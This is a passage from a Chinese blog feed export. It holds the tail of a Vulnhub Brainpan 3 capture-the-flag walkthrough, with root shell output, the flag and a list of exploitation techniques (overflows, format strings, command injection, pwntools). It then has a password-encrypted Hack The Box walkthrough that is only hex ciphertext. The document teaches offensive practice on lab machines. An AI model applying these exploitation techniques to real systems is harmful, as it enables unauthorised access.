euid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">brainpan.8.gz</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwx------  2 root root 4096 Jul 16  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">-rw-------  1 root root    0 Jul 16  2015 .bash_history</span><br><span class="line">-rw-------  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">-rw-------  1 root root  140 May 31  2015 .profile</span><br><span class="line">-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz</span><br></pre></td></tr></table></figure>

<p>成功的取得了root权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg"></p>
<p>将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># file brainpan.8 </span></span><br><span class="line">brainpan.8: troff or preprocessor input, ASCII text</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># cat brainpan.8 </span></span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>堆栈溢出</li>
<li>字符串格式漏洞</li>
<li>反引号命令注入</li>
<li><blockquote>
<p>&amp;2管道命令输出</p>
</blockquote>
</li>
<li>python的pwntools模块使用编写poc</li>
<li>pwndbg调试shellcode</li>
<li>ROPGadget找到清晰的eax小工具</li>
<li>偏移量累积寻找</li>
</ul>
<p><font color="red">Game over</font></p>
<p>这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it …</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[Unbalanced]</title>
    <url>/2020/08/17/Unbalanced/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article($6$6H...Yw1)</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="67a1faf8e46c717a189e94ec002b8f9a8f7f5b1b07eddd0cfc508c7ff6a88da2">2d1b01a22cb797f2773ece495ada8f1f08ce374f4ad0709157f512ab981b6bd96ee9599c5e0872a906e222f993e83660ae50577fec6e0cf9e9bd31f7f909a9a9fce1cf2419c5cb978edcd854fff38a9d85b36d061785fe0239541e3e76b263993a3a77f313e96e5be7568847c50ca91911ce463707e39cbd0a5d8e1c8a912f81713fe3dad573d2d87559425ada6fc069e806a62f3f7258206d5e08c45fdb75fdf9947523c2fb76d4df5b72b6145b2597220b38c614d098bb75e18abfd124ca4d78e78c1dcc8aade9a214efa748db2bde0a2fe7d30a2736b6ad331aa8f560e7942acc50e163f5129f6e6a05a200da8d32be48f9125a96a343c07e7b15fd4212145da89aaf2543e1ef1b0f84bbbdea7d2fd901ffabe6102b76d2ad1c5a39ab63c08829b70615b15a2492577ef176e62ee8117a31e0906f74e4e630f1b1242088f14593f4f38b3d2de768a3d7ac498e60b8129352fb8a97ca8ac2ace4f71cc8f8a659e8aa6749de0deb106192fa2912f137471ffcd84079ffc8ef209ed2233bb0217923428fcb4d2995aa24b7429f01790fa1c3b28bad38ad4ce9bce18faa931cb6277a3f32813a7a855d5dca20312a47dfc95b9e33f949d00397f4e753a2084d66a838514a502a70bc841eca1eb22908f2f78f259738e275207a16b6477f9a5979987179ce3748eceb75f044ce4dbf2f7c7841a982a8c042e3adba06dca71e6f383c6dea51e01d2827414cb22d3243d9dd8806522ea507168be80990612aebffc7aa8e0e11a1b81dd95dc23b2c90bd49ad2c38d8a264363f1ecc94dc0b28527c689c87ed0a35d34a44013e6f400387f472b458901cbdcb639d4313f1d30607e053e9711a5a2ce2b844372479bd9ef2931598e64b985a1865c19a88e5e197b33508e9690753dc0c28f75a88d4702517a08327ce93d5f15c96fa0da0e5aaabb98d343343678989d29c49dd516021fe31f0da1e6252de6f8e4b80e504e0918b6d5c4c1015563c924747e1c99bc1f499caa3f6b9c5d3b68ad96d9d34187bc32dc9eb68ac60729628f4ccc3b538796800eee60f4910c5fc13f8102f937b5784c04da98b3a057c357cb9a03a18cc7d92b86f5e5f0c55b0f1ef350200c9739b706691623e72725c2b5a646ea6eea77deb6c6ab7e8637e6a664d4413a872c3aa28cdc2487e0abcf3c9fbe257805b13612b260ce2f64518d67f1012fbadce0ad1962d50e907d22dba68d7a3222f14454b7e93d6e0b137807da63103a23eb5a91aaa7801aeb31994db4f02654550a2a3994edfe7e84183d72a2ce95065c8d9d47a4154735da5a3e8aba1adefe6ab58de359d6184d14ed52c7b8eb198ef8c970c345343df06eca573cc1d203efa091b63d3716e371f46af866d14c5dc91051f16f8996394bab9baf8e0339145707d242478e1388ef2053a5c798b90eb7ba8c6ac0890cbddd8231bb16825e18ec1f0dbb07c9ed64ff6692fdef0c3fcb40c85aa692b0f0f671a538a192e059ab903dd4d12d5089a187630ea705cdd5017d2d4e4e9d4b20e636cd8596034baed4a0ae746975a89083e17ac1de6edd9fc0ef934ee9104e3186c98184e41b8b6e52532e65b3fe7c7e2f13b855f98d9c4e53e8fb22f396c08dbd758c8bd57e789db4f8faf6df7b36e111111f32e050305fda8001530a89d8b77d1abb9eae6f852cf0ae6c351fd69b95113e31864e093b209563d6ac163878295201a7e8db34812428b78d0d7d02f1ef15d2c3c02042dbaa9e31f154789eb90a900888217f2c9c130df61c1016dde2d392285471c0bf00f7437a3cf6709da5400c53bc5a2467de4de06925ff50c31293abfc7eaa293b4d8cc901079c1d2c6a98805ad780680a1f929eed503e9ac4e95087bb5be986acd08dd1a1cad4bc0943e49d2f621d7ef38b6c23bd7ea6329133b715c30c1d4263e4729c1d429fea3945d52cb606f58824954f02ef14d5349e24b99523b3d94ccaabaeb14cb591ae2fb1a97401cfa6b4f52d3fdb9e63e727cb7003ff1fbff5ec714ae73b8a5d8db018d61529e1edfe73e59c1ab3e4eb2758cdcd869e4443194d72a72aa7e29f9cdce071dcee41fefa1c28c22cc80ed6bf96cb247fd8b1195a5827f155512b7e3efebcc8d0ebea1c433e13baf4d91d720f6500726df027b0c0a9bb35eda79a8be57d58ee0cb3ebf5eddf60457ec175c7170cea688993a4297f2c69a1a81d8bd2468b4652528114a7b00cec07e7e6eefdd1c742f31391f66cd3a29282a2ac8ba6f6b828dcde6315b928b5532ae4888e798c4ca33dcb63a1f7671777395877aed6e3a1df8fb34fd40acfae3df07f961869468aa8d26bae1192d331ba9f34a5de4e0c02568687793423b2514688a1d193388252286f5616128326afa61192ebfbbc3667c62e3858186128f321e716d470c7ad8e9b03410fb0f69a6f43892b90b744ff4b4f86e8791ec92c7ca4d631b5378af67a8fe451b89d8ff83a493e17e928be2805b6cf9a40849f05cd39ff6af0e891e4f91420f88383bc107282ffa833f73efb48133c5546f28be8cf5e5de41ecab20734b78d2f8ac44d9967a1200bf5159de10f310ba496d03fe56185b43a91de2bf78b0a32183fd05163e64b234444b2ecb30851525f0d8148d45bab1628c583e3c7e3376a5fac2b3bf3e14ba8e6db22422777ff5e90275fa9b13c222ae06a277373461ed9a7fdd4b086c503ee3cc0def70dc4f37525492619d2c3f793b7a6d968e613f4f281d5e808ca386e91b7434946f60967dde9ed195acdfaa03df7cfa77dd93972162be91f88d008fdafea938cb5990ae2cc3445b66323c48a49d84ac49f768acc885d2a46be8008b37e6e27a9be343fe4b75eafac3ec5ccdda6a89333fb3d329caff34399b4066b6e98fff9f9874ad280d105ef8775c61141bef2284b351c27f4dc650a431f1164eaf48dbdf44da35db0b86b449e1ff1d3a29ef91fbe673dae903ab59725eaa6f73294098e2ac75120e34af4c9de7fd8202feac6259363052f6f969d69933e294015b7ff1bce738da7cfe7c75de8bb70362fd04f252e641028c1775d5da6246f3d70001e403c143377ac917e175168a0b4df8d772d9809791e23c0b58340dd0cbe74cff3a4c8aa862e6fde9c609492c7ed5019b71d6da51e3999ecde0cbd913166bbe2d3be07c77217c8ac3e75f192101f8b07d4c3bc96c8ad97d46ac5acc8b62bd76e1b5747077e176a7bca4c96924093639b5c199c5d2d767ac66c97d4f2c335eb5feb7a775726e5cdfb0d66884c9c38c8f61b1a7d8c713e5c9f519ad530d94de767eeabdf9350b493694e2300ae26ce0838cbeab8befaae968424bced4751b13484f937f21b71b8e9755147c49c2d07808d05392504e0267c404d9d702c8909786850e4dada63c8854688b7e50869fd190cd859623e626112a0090c1844fb8ad836309628c36810d5c0d9753a91e066338e5cbeeda05b72f6bddbf84efb0f35bd8e15e94ce756f813912b45746d1f898cc83d353acca189848e6d1afb264d80ccabdedca3a748e5af754ee78d66ed39aa4380028f77be79ba5739bae320376c407c8461ed3750fa870ade0f453e6c5168e65338ed3ab1d5684696de82b9d4f945e5c4405cace1637b8cbf941a26071508b00cf02d3a72c839a5c450e0c4ab23c2f9400135000cf949f055984ed73c952837c96700adfd061b121cfedc25c4ffb8eedb8745a4e2f0314b399a5a56e19bf7e942aae1db4a0587391c73e7ada4f3c8749f6f5a6c7fd8f899f2b34ff9cb22f689bb4cf326517462c9868cdae5e18315b219c9767c1a2257b4c8b4e315294c906806a8e8310c4c1298640f67af9c83dfd65ceddbcda8e6a32962260b08f57308eeb041b0f21094081150544e7fd3144c6e0ca8a58fd256bac66a525b2cc20343c34e241b3dc311bfe763b77f0dbe643e04f14693c1d280b570572923cdb1d63f03397c1baa2a6d19d627337eaef207b9a6d14304da746d7a45b82f163b9102adf4b7cd26961eb8b902d01900cb13c01b65f3dbba9d416098e88c550bfbb506960149a9e169bb003c78db014523d190e3600560c8f84b9d1e0a4e4337b07114494632aebd1411eafc4cff5ee973a6d8911f25f0268f152102463652dfd6e308cc03742a8c221b5b98cc32785f32e877d32438465654552d6a3d8d5014695b65e3168b3006c9de2833c4f54cd06855b47c4464699e6c1c0431301dc38d3d9c9e09a06b7d64927e886f5d8214c465fc6edfe761b232ba6da4ae5d4d6bcf01a4dcf7224423c60bd91bf279d1d5e214e69c9f69d757ec02d2edffc072aa92d867205f9905d7379e4591c65995f67b1154e84be3f5e3fa2ff749009ba331bb6b429e42f2b3ab025c3d4bb894a1300fb47964008247437b17cad4c2ab5a065f8717bd610892fe4938526b1e0b98662425f752359b10fac2a201803590ff186ceb6ec16a71c035690a798811bb0ea5c3a5a07e55c34a83389cb530d8997cbd1e3a28669d8e02faa445e2e2afcbc9673d0429310fa54f57065fe3e23040b20f71362a915928993a2fa951fcdbb8aaef37723210ffb95cdc20d3a5cdb642ea971e2b6d0f68090f79d8274a7341892b92d1fba8ed7c607ebbbdd133befd30f9bc78d99da98cfc084b69cde2759e53ec47447fde8987fadd191371e8510e4e7677459b4896f8cb45c518fe6d0133b53da095097bcb30765c96e98b292af4b88b52737eee327ada40715d620b875dede2e96cdb285f69258637554b2ebc020ae0fafea1a3799a44ef1c8243ba66229143f5095e394e061be0f22ce70e29f28c684771133c82dda8aa08ad77d171e9c7b0e67e176f384b62ae3a36702c6fec6c908a9ffec3fa299cd0bf6ef833d239c6dadca95a1499b86ffe8dc55531c3d5eb456dbf70eefe43c3fd23b305259a6c3fd087e55249865a9a22a803bc5ddfc74ff77c1c9f1e03ad0b1e687d1bfe3f8452ea35e5d10aca43589fb79d1eb2f48630b69f2e37cd0aecffe352d0a27c53573ef474ea2087676472bae5bdb9c274b1be7637f42d514b16b2941eff1bf733730ed267259049d0368c2d4a04eba3e8d62d4bbce544ee47262fe080566a7b5a52343d9f61c70a8bc70746ae9f53fda13df419be3375e2fce6e36d8be043a1c816944db62cf065ee262606fffe524155c40db88da977165b123085405fccc65aa1beb405ac64b476a2b9fce3a42ed4ce27db6ae035f6fc6b3f66a8f68a9d88d5e6825b6658cecbbf4a32819dca5b6cbb253d1c49a6fd5e62fdd444043cff69dafdccbc290f339fb7e3f0352a4523b2108bed6b5397abe98f46026d3bf6f47ae183471a439e820fa791c8300304097f76f92667828bd5a4fef09f78a6024bb83fe51780778d637f96bf3658011b8c875aa9eef24e464d5704bf2ef61b4b8deaa256ef37b34210d745539c620891ec093a1d222f6da9f6c87c5a605a99fac2f7fe643f0dc977ed4ca07fb3960e965598e61e13b31e0cb651e145f038b9bbffb126e8a1b60da15fff0e37c7ab8ff7987d2467784b3696c9527bb6f9606d5f47b9206a02a27e039805f88f679f849b5e7877e61c264cceea854d7466afe0761e86cfd408b629ce19318c11fa85d87be60fa7f445e6f0525ed9ec3f2e36e2492b4ad5b35f357acdbab30c02a216d801cd0bd27d2a46b6ffec22d2ef38b194748f88758b61d20e4851c6f0ceab13bead71c021184054efec5b2b195966d190a3045b93692c10a234ec30a47e9d7c2cfb05fbf16189b03d393678bc20e69cc23b59d0e640501b4a50176fe7557588a8f6a586b1ee64e5d100f9baa6c549f4bf090f177e5d61653bc980c2be5074e8be00a20c0f1d93a473f7bc9fa408e14bcc540a1007cdfd1060bb118c73a9aecd9b03b112d42f7eb215dd0812fdc132fe2a6a39f6970c01bb41ec8960be11c1b9716ea562c0d609e826e7038383efab7ff0510ce7d39694791ed4b16c08345c0808fc5ead5c1e6bbf35a007e46043ee33075150bf0c99fa359940a6d9278eeee2ced2bb18c92f1de697ddb25b01c66c04d171e60929702af1cecc543ce5716e2f4bfa743700a9a5c5bbfad7b080d5490851217651f949fec7e85df1c1ca25e554a6ebeb0c4bd1d7863258fa7533f370e742c1d0caaf5b971d2a7dbdf5a86817e93871ab02e2447fb138646498976444433ddc411907d1bff07a2ae3b6459facff6cf4908dfd4ee8031341c7ec0c975cb03d8728bf18860805f1ac1cd5a56abc68400b58d90f740092dcb67ee4edb2492205682a12f70270036d9379717f8c1537330cd77d99d575723780c68d9d580c34f6d56632fe5659752c31191c010a7911b501f0cffd9b298c5536f02048ed41fdf614bfc4d369313dbefd6cdc8b4ab1ec2062abfc32e1549e1543a468b34b30312996b01932e09549eb2651bfd17888d1491cbe75b0640b79cc933f3bfe42b7a6956f639b9c5d8f1be2c529e241828b191cc7536b66df165ad79f16c182ce96acb96700294acc78ea0a041893d4915652a65d46393b1a675cb3d325a9f4537afb86d9354c74ce7883db434ed4ed091f2160fec830085a0b44078a87418decbec84515d2fb3191485a71f608c35819e6cb29c3f4e84281642d0aeac56cce025ac2656aedd47a31d38ed46dfbf100a9e129426fa843ac7381499280f6e0a64c3abd07396412ae9c4494e879cc9d554e21f254065647bf1c1d67330b93901736640c489e35c27ba068668ff86385b3b3096a61c305cac77a71acfeaa85ef451f467b5bd2d78bbead8df0fef1cb2fb281990b238c46bb589e11438037fb8e71de4fb973725efec4a4bb068010da777068cf97c2c0dc804708537cf63da3bca091ca57262161a54c9bf06d95188b463ea7ac80c573315c014553ebfcc8110e0bfe5fb74f1a3591d1bc4fd3117642b053ddef765ef518545313e577ad7bb17605f0c4eba2e9a755cd94ebb35872e67742640cc15b24c377672d85ff128605b4469f6e472a50b833232e9e9fed189bdc0595a2a0c2fe7abec29856bc48d29777fe92fc29a4c4a6c922341626f51aa2f8e42a1ec7a478a19a1878c7c7a1542516d43a5a2e53b672e33fbe6bfb2ea907f0a929bbb4fe8499c1d89ebd295fd90d87b5e1684618f85180fc8dba5dc576ba0eaa1d0f5fcc97db31136f275a3d8f97c712cbdf1d54471f945e3d1c25163335eaf6e0b98b4eb3260d818b54cf3b5e285fae9add64ccbc6b13acc4a407a89349e9452185eaed4701fa44444ccb39cc06f3f61065deaeb33f7385800153315442e2d1e33ff1d0d02669b2098db001b4a856f7630e6ed21ef20d110567102b51e6a99b2bcb69bf23a18603e56844545d395c33bfef5c7f9fb62640d4b39da0def0e88c2ce57334e4e2c96aabc7d482ae9676a30bb1ad5e6d1fedadbd312349ce15dfda8a7d68f3ac0ee8f1d6fadab445f294c6b5b138c4ee02812a800eb447adc2967bf452b66f3858e96ecee1a5b63a5188eec4ccaba35167173e3a8bbb668f7821f1084c9e87c8d20adf9ff47a4a7dbd51fee06688984ccc8b6b02c768a377ce540d04db8d029e570ee91dfdce26882e92fa0862748b9281c17f44b61126f7c1b202b3e57770421dec7733ae23e64f9b9b80e544e6b3f671e38b85aa43b79339ae0ec76974867a442d8e25c7e758511568e2ce416611b9e5e0b1894a1967b689c2f1249f394d5527b3f5e22200815344ce066c1feaa66f5d5557a3a6246ec67ecdee95a9db7c305e3e377ee8c05305aa41026a1918d769a0262d3481989b690e121829614e4a21bade83155da59fe5901812adf974996e669ac3f73ddb6a20b0d9d85e66c35f1d1e5339d27d822ce3383d1ed09cd7a2b44b1dcca6e6633ecb1c8d2c9e6296da185fdbe8095ea53a92c31350a0afc0afd72e18af07591b12e370b5d19fc6d1f21a5d10d83550fa5eef644ad4c5893ee92e7933026adfbc4c2ae7a71143a8dc4897a8e3e74bb997ea693e533ac30e483c99b7a0bc3f69b0e6ed61bcdf33f76460daf300267145118fc756a41703f3d00ef549ed3b000c423973a376daac1c8f03005fd1011ff7e672e70fd878484dc97f70d009059f9ce6306ef09ed77e030f48450a6142842885cff8edccefaf536cdd5564aaf004df5f7cb64a062f943b9693eb4ba9b8400de02e99e90f09867fb46384e87077c70b19d6a91c3f1cf72df166f2975d268c5e6dca51973688c67cef01fcecc6f5b90529f5d483c1f8281ebe00c7bfdbd892edc8c9fc938e568100557cf8ca99cb069871fc5cb9f43700b7c9e1344ac67f835fc72be1764a6abac9466554124e46ad1eab074ed50aaa9d7bb94a1fe72cd2a0c6846c8551197934ea6bc513793aed8721b3c498c9017149b90a1afc7bda12e2a23ccdcb0ae2cba13b9a9e42c126c70edace0f9c7d2f4e7a31d599d0ac3300eabedaaf716b3e7662a7b336307c22fd7c2448e3b681b15b32949656f81b52fe23155e6bc71133ae06a2217da52ab39ad803041b6a86e381958f26a297639486dad06256b7b2cf9d9e873d988dee3a4e8c07b53977f487ea3ca96f3271be623b8ae3edeaaaf192a0c916e23de780528f50d7db18f5c19f83353313af2b07e248c671bcc4323b132db8aa7c48a9367306e882dd39098551d6bfa0f6981693c41168fae3014bd4c303f8c4970474ac80adca940b758e01daab934382a9b23bba7976c76990fcb05fa143ef602e74300ed290a0c0db4645b0fdd4891698ac125d456a3acfa112eee96ba5f9d8823316070126c093bf6dd7b586b315f32e65114fd6180edf707054e2360ea887b73c6ca73a1bc0e6734334bb25ed16ef87df686e69a30e92f1702188bce0fc5b73015af3637761adf52ed1e725732bb35c906d4133fd5c46438eb91ee9d04f921b3961006c69ee728009beeb2f84a125d96574efeda9f60bd5a58acbde1d2cb53b61864dd2ac1bfb17ba7786f125bd0b440648f0b5bdc4c555e204688d58c55f9ecdcc18ed2173bd8081ad0a0177047b1f85448c0228bdaa927f1411bdd0119cb2c9f7f0a425643ad9b01560198e1e5312697ffacb014887b70fbfb3f677656aca024def7115cc800ce6232aabb5ff7022a6645694e11888af04ae782c8f78c5691fa9579f0c402e5eb82b57d5971cc164abf345686d9172f3ce43abd442f10f5b4a793f9cd415adccacbe6a075cc55f037494d44928ac2ba99ee1ed49e3f52d703fd3c805ea7e6f8919087d0f549003d9c5ae550a8ef10b7aacdddb0990a0f14fef250775fcefee0bfd19a0563c16a3b9833abd35df6a70041a8c45cf8bfe4700c6a88a16af3f74bda5e67d4bc7786becec450ce6b2952b53e685c5b50a471347b38122fc55b4a8c19dd4063eb915b221d1c296ba7f8137aad1abaf4705786ab610045261a4a7fac894a098a300dcf3d9270a4ce65e0f703631a830ae286a6cbb669114569282c3359349bc8fab746b2bb24651d6caef6596231bbdac08f4bb025e6b6a28715f24133098edd7ba3fddcf882191e35239c7fb39e08805fcb0ca28735a9c2424a5c4a5bef0a871da027a27c5898452af3b6d9dfa5ff2e30d5b80e69b5f7aa04972b2fb80b431849524f16b7edf72d62b6eb3dd3b392872e833423b6958aa1d337b4d61c8368b8115f7699a4ee3628539518f6dc30bf7c0d099731b6f1ce1433a47c2a394016f95b0fa25894e2e8de94dc2b0280b900bce1227d4361de2e1a5948c411a97fbe120d0c0246cc783a80c8393c2b312de46fad05dccb28e1a47f23a9616011ceb034d1bab66c62454e53e722584c253b207d91238215d9751b173ae631e09325bad8d1e17c92c4375c95b914568116d428dfbbdc07f5b40249a9d33d70f02af6cbcc549cb26da1ca9df5948f8989b4f245055baa9974854ae4129e9daf66c11207892c3a525bfe445f32ac694093ad83406d1b5e8a227f66edb6742dea5b4ba036b4855375817ace7a89a1829b8792072560abba137e425d801225bf91e8f33dc37b4ea867df18c565b371f6a9ea13070a4a042d2b1c19378e88d07899461d929c3981cf2e14134896492f548db40f387f4f5c9c4070b4983cb8dcb02e21fc8a4a5eba59687e673b46462cf12daa7a37086cbc6823a8e84e6c04366437c8fd7eb3756f2e88ac8d0dfab502b06b94601bd6c7f1f096c285068a9862fc531c231858783a0eb0202c83aa596dd67c554d010db39eb872fb3929d4e95350f78a283740c66db7fb381837387f419638a1408b5866b8bf104b5d54f9ac21543ac912939280e1f1a248610a3ad0cdf85b1946fae3e4a601ad62509e915a72910ef394dc726431219fcc79c897dd74d80c2987d066c642bc69f940779c41ed8822926b3baf6248cf1c0e0c30888fc92e0a8518bc4d0979c6cea0d24040315cd41d248c5ad59ff20b6cbca896b0948a458f0604cb9b3b40b3e20c552182a239235caac42016de90bb98e30227c2073b59b890bd5f56a77904fa5d22d2b43976455dcda99d444fc078dbd32376fbbae0b3eeea8152f7f253fad83bb970d89492fa07154ad3c56dcb234e1320548f626b936846049ddae71a380ab89e6ef1288ac66b65703f75bb8c6bcb98fcaec1e89b7b103eae35814e261488c31d4fc8d3375e54ad0071e21f731481ad6449869484bb98fb2e37ef58506161d1949f29b67a1de141e56dd6af793f0d1101dbcc4c6e4307905838205edd5f4161b096b6fd513d2f2b350ffb3b753685870ec00043d060fb62405c8eb6bdb130b00870a4fa3a39622dd6016af71997fe6943b0e334bbcfd8e4d1a3c41507aa7f0de49e7d37828c2870571922e689da0e55b183c7d0bb7293d65ff070ebd507cf058e371d85e2a4725e78eca6ed642fdbc6a41cfb79d172efb546f0d1d653d93e199db0efa1e3e2e01340894e7c38a8794d3e750e83f2d7a2831881ed52ce77f4693b039eba021c1b822722e919cb4d9e0abba81e733a061f6c4cfddc593543c320dbc28c9935eb0bcf18b3b7b7d2b4cd07b9ae096b356454ae16bcef4728769e9b9bc4e19fb75367826592742141b9e9c390a002639f1d99456209195374c637978395c433c9c35136a486088476bb4624c7da5f8fc02b87e28b3aed55bbc55bbccbeb13288674c276022c6dbdebf2345dec826accc8aca3f05cc06a8ac9606ff52fd5fb040eb8cf730be35aa66ba851d526a0025599e7fe880144d0f439422b9f282d21040df9130961cb5a7ffcad76568dd483f6fc6bf0f4b5f6e2ae8037be5d8a861f72ec4213942c6ac1f530d8011a3811f604d681234a07de15758918b46589f042367ab401ae458f65a3a1b15a469287ce2fabc848a8c7c6a3b3a767ec6aa033fd54a99db2743c4ca697c2a00e6e31fac84d8b4bc9e5df24ed255c1238013b4f0099b74873b14d8266d6057c8f4318a1a8c68718189430c6f89bca89d287a1d19559c0fb4b877abea62cde20af2753c0d8bd859b77a9ab78d5cc3cc350a741dd5f184d6a48d7ed45430d01d3ca3ceefe83a6723651885cf4704a33950d3c69be6924e8a995b970b28dcce604a97c7dd2e31d89698dd7c3f6d0364701bfe1cc641be975f4fc313deb07385fbd5e727b7c9bdbb8c69efb7f59c7491e90e4b0858ac89d97b472c97345ff1137904bd14930fa2c64af1184c4c84da66bec7bb76dba0aa19d53a3138b7cb28d90d694204a5fb2fea1c9c51df260e5f45a6604d8761ca5040677a972261711fa8f64a87cfcb58d231c2caa07bb7d2ed6bf161c57be000c735b60a0f5261389aacd5fa30a12ac39f08b9e865b1c9e5a292de0f23166b41e06883b69775a084f4f6ca363779edc1068af12c2bf317c5ab57d123c7d3ebddc10c9ae3b433ee81da27c09eeb9849e0aac8c640d21d0a706dbedb9cfa81bd3c6e64d86b07394af8ea6cecbb06050df21127468dc797c76e423a8bf434d52550c5bcd2349b9b0b62925e73abde2f557a5fa3eed71645414f748061ccc131c5bc4dbf3222ac933dae8995743695c75c11f4ad6d0945f5d240209ef882c59ae969b6ed2d3bb78bdc3c3ea6f529ebe02b5bed13a997562fbbaa283d73cc4a972b86413a5fedff915933acec37352f0d129f4ce9620b6f58446503c6d62bc8f77ebd75d14444ca04d8223c429df08408edadb51f91f793b4737703e52c9fc20e3a6a380a29691f06f01332b2bbb12db730438668293888bc98d34d886889dd9300b657b977a3feb4bebd9fcc83e9a89201eaa4474c9855aea431c3fe173d3e7c0f930cde90dcfa5943470353c9034b68290d93a97c645075b281656d0ec40e97ec1f7dc94110821310dcf999fec443bddb04399adffca275136594a6add6fe55f8528f9b3972cb03d1ad3c7c1a62cf35fc999b4be687ec6c30cc5e750a07159d11d5e163587d6cc1f6be80d7f18ba6e0d80d13aa9d14679eb37fd485b03119b6fed90f73e043b5fd4602c9d704b50052e86d0fabc98e2d6a8eeae889dbc812ee100e0f3f06a450fcb99a4a1d34b239b42c7012ffdd8fd81304dcabee105497ff3fbc7e4caddb03b700d059e04bb6ebbb1d57036d16c184ff08a5497286ffbb73491b6aa6e12ef661fcec681982cc5b6e88bf56364e378227016e4c2d694a4f5bae5f460a60428c99962c613d8ab44bdbfe8653890ba0a6a5772a052040b8432d388f48f7b590f43e3f05b90647aa2ed8776d3c20abacf33841fc714b9efc31090c859faa884b2d115efabbe42a57b6f8400b6c0a52f0a0a88a959d08e051084b73097440e2a1254eaffab39bf7f97017a7fa24e78060b9bc9c69e3e67f784cbf22ae3421e29e59302cb41db2580caa458c2b2b87a7ebcbf767441764f227152a84e260c999da0a28d324aaf3cc12cadb2084aded0e31ba96b54da5e8ef08e7b3cf952befc4865fdb1b7480d0c5ce58b21e33dc71b283ac65d0578ec8c474502ba6e610a88c9a147a5fc21550fbf2d044af153432ac0bbdf554f40e8280e4964aa3b5b8a0c54dc13f0a8cf74ac23917c9cbed961f863fa1a8ede6dbe0940de335b93d51e5dd04d4e6be699e5483500c3405bd017387aa2954f8a8e5d80bd38ccca7ab865427e178456949255c413bd502687eae99e2f74b22654286091c0f30fd8012affc384b1e6d51978e430d89620a61d8512a99766278665253486c7cfc54b2ef803fea29558c5cc3e50a55e656e833ff75e9c19c2d0214d97c2823664fba97b7a96a9539155026bb56e03b8d8d42be504bc6b8bf68a2f2515011e6c00d853162362065a6c4b931dae10238660541bee5c9a08a84adb9a73ae10309e183daee04f24953d77c2f0df51d7544280e9f526643f357fc49b5f3f731b7581d30ceca6c81d49de6232800b6002f090859539cdab018b2c26ac835c1ad6101df0ad3750bc939c83655231f5b79d1f626fe3e9c8e86beda8afbc65c387efcd179f6dcdff93ea8c4397152e945cbab18850f9b1e2f292d24c5fc632de631409b03060cda8712117c4556ab2bd14f8b80b7fb4f6341d8796e5591e47cbafa2a14b1828bee39e2f43ea67b8a5c0a3cd86c3adaffcaca3a0a28c79814875fe1af9af94342135d9850d5e83de1f07d82f7be74c59b53e4f51d3152079ff9ab1c6685027f115ee1ebc098ab5420933534dcb7a299dbbbaa306f835cea9c2e84f698522c2391a97f7b548cecdec8c4fbd9ab4bec34e1568fb45ac7f6160448001bc335417018f96e688ca0246c437a92d9aa3cacb17bdeda42c55f38d094483f36c70920b6165e1dbac5cd2029dae26f698b0bac23f6338161feeeec390337ceb1725690d7665641fe72ee58bc39efa22a52a661754df4b7e96c04fde7fcb7170209182a3ddd6179be4a98ef140efeb7439c81a348375fdefef9eb7f3c8e75a14b46f7b7b63f050e73a6c0d9ae6811eb212deda0e2f8b3d5d547e3935675a11df558c2200f90d45d01892e0e807d6c3e6d53c1af195c42e4f6a7f4b8a4610e5b11de9678e0c2574b6a3f1d2d5c36256d41ab434723e0dd3c3e19ccb2dbf6a495f7a25f49163b